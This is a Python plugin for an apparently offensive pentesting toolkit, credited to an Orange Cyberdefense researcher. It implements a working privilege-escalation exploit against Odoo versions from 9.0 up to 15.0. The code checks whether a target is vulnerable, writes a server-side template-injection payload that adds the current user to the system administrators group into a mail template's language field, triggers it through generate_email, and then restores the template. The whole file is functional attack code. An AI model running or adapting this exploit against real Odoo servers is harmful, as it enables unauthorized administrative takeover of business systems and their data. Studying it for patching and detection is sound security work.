from enum import Enum
from ..colors import Colors
from packaging.version import Version
from .plugin_base import BasePlugin, PluginMetadata, PluginCategory

class VulnerableStatus(Enum):
    VULNERABLE = 1
    UNKNOWN = 2
    NOT_VULNERABLE = 3

class Plugin(BasePlugin):
    """Exploit found on Odoo allowing any authenticated user to
    execute 'some' arbitrary python code on the server.
    Thus allowing changing its own groups.

    By Guilhem RIOUX (@jrjgjk)
    Orange Cyberdefense
    """
    MAX_VERSION = "15.0" # striclty below
    MIN_VERSION = "9.0"

    def __init__(self):
        super().__init__()
        self.connection = None
        self.model = "res.users"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="Privilege escalation for old odoo versions",
            description="Try to escalate privileges of " +\
                "the current user, target odoo < 15.0",
            author="jrjgjk",
            version="1.0.0",
            category=PluginCategory.EXPLOITATION,
            requires_auth=True,
            requires_connection=True,
            external_dependencies=["packaging"]
        )

    @classmethod
    def is_version_vulnerable(cls, version):
        """
        Compare the version of the target with those
        stored on the class field

        :type version: Union[str, Version]
        """
        if isinstance(version, str):
            version = Version(version)

        return (version <= Version(cls.MAX_VERSION)
               and version > Version(cls.MIN_VERSION))

    @staticmethod
    def get_payload():
        """
        Return the payload that will be injected inside
        an Odoo mail template
        """
        payload = '${ object.sudo().write({"groups_id": [(4, object.sudo().env.ref("base.group_system").id)]}) }'
        return payload

    def get_values_to_write(self):
        """
        Get the dictionnary of the values that will be written
        on the `mail.template` table
        """
        return {"lang": self.__class__.get_payload(),
                "model": self.model}

    def _is_module_loaded(self):
        """
        Check if the module is loaded
        """
        try:
            self.connection.models.execute_kw(
                self.connection.db, self.connection.uid, self.connection.password,
                "mail.template", 'search', [[]], {'limit': 1})
        except Exception as e:
            return False
        return True

    def check(self, db, username, password):
        """
        Check if the target is vulnerable

        Basically, you need three things for a target to be
        vulnerable:
          1. Version must match (Will not be default anymore)
          2. Mail module must be loaded (Not Default)
          3. Ability to edit `mail.template` (Default)
        """
        if not self.connection.authenticate(db, username, password):
            print(f"{Colors.e} Authentication invalid")
            exit(0)

        if not self._is_module_loaded():
            return VulnerableStatus.NOT_VULNERABLE

        version = self.connection.get_version()
        if (not version
            or not version.get("server_version")):
            return VulnerableStatus.UNKNOWN

        target_version = Version(version.get("server_version"))
        if self.__class__.is_version_vulnerable(target_version):
            return VulnerableStatus.VULNERABLE
        return VulnerableStatus.NOT_VULNERABLE

    def run(self,
            target_url,
            database=None,
            username=None,
            password=None,
            connection=None):
        """
        Run the plugin and try to add your user into
        the admin's group
        """
        self.connection = connection
        if not self.validate_requirements(self.connection, username, password):
            print(f"{Colors.e} This plugin requires authentication")
            return "Failed"

        vulnerability_status = self.check(database, username, password)
        if vulnerability_status is VulnerableStatus.NOT_VULNERABLE :
            print(f"{Colors.e} Target is not vulnerable")
            return "Failed"

        if vulnerability_status is VulnerableStatus.UNKNOWN:
            print(f"{Colors.w} Unable to recover the version of the target", end=", ")
        else:
            print(f"{Colors.s} Target is vulnerable", end=", ")

        run_exploit = input("Continue exploit ? [y/n] ")
        if run_exploit not in ('y', 'Y'):
            print(f"{Colors.w} Aborting exploit")
            return "Aborted"

        print(f"{Colors.i} Updating `mail_template`.lang table")

        ### 1. Find a backdoorable template id ###
        old_lang, old_model = None, None
        template_id = 0
        for i in range(1, 32):
            res = self.connection.models.execute_kw(
                                         self.connection.db,
                                         self.connection.uid,
                                         self.connection.password,
                                         'mail.template', 'read',
                                         [i, ["id", "lang", "model"]])
            if res:
                old_lang = res[0].get("lang")
                old_model = res[0].get("model")
                template_id = res[0].get("id")
                print(f"{Colors.i} Old values lang: {old_lang}, "
                      f"model: {old_model}, id: {template_id}")
                break
        if old_lang is None or not template_id or not old_model:
            print(f"{Colors.e} No template available for attack")
            return None
        print(f"{Colors.i} Backdooring template {str(template_id)}")

        try:
            if self.connection.models.execute_kw(self.connection.db,
                                                 self.connection.uid,
                                                 self.connection.password,
                                                 'mail.template', 'write',
                                                 [template_id, self.get_values_to_write()]):
                print(f"{Colors.s} Payload stored, executing it")
                self.connection.models.execute_kw(self.connection.db,
                                                  self.connection.uid,
                                                  self.connection.password,
                                                  'mail.template', 'generate_email',
                                                  [template_id, self.connection.uid, ["lang"]])
                print(f"{Colors.s} You shall now be privileged")
        except Exception as e:
            print(f"{Colors.e} {str(e)}")

        finally:
            print(f"{Colors.i} Cleaning exploit")
            self.connection.models.execute_kw(self.connection.db,
                                              self.connection.uid,
                                              self.connection.password,
                                              'mail.template', 'write',
                                              [template_id, {"lang": old_lang, "model": old_model}])
        return "Success"
